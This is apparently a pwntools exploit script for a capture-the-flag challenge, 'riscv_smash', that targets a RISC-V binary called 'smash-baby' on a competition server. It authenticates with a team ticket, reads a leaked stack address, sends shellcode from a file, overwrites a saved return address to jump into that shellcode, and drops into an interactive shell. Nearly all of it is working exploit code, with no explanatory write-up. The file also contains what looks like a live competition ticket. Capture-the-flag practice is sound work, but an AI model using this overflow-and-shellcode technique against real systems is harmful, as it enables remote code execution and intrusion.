#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host riscv_smash.quals2023-kah5Aiv9.satellitesabove.me --port 5300
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = 'smash-baby'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'riscv_smash.quals2023-kah5Aiv9.satellitesabove.me'
port = int(args.PORT or 5300)
ticket = b'ticket{papa544237echo4:GD10t14Dqob7-F-Ec6XLG4bT7Zv8_pIHNEFQobutMyiZRYmILotSErSMYYh2U1g8TA}'

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return process(['qemu-riscv32', '-g', '1234', exe] + argv, env={'FLAG': 'test{flag}'}, *a, **kw)
    else:
        return process(['qemu-riscv32', exe] + argv, env={'FLAG': 'test{flag}'}, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    io.sendlineafter(b'Ticket please:\n', ticket)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

io = start()

io.recvuntil(b'here is something useful: ')
leak = int(io.recvline(), 0)
io.success("leak: " + hex(leak))

io.recvuntil(b'Exploit me!\n')
io.send(b'ACEG' + p16(0xcefa))
io.send(flat(open('shellcode', 'rb').read(), length=300))

io.send(b'ACEG' + p16(0x4242))
io.send(flat({0x24: leak-0x18c}))
io.success("shellcode loaded at " + hex(leak-0x18c))

io.interactive()

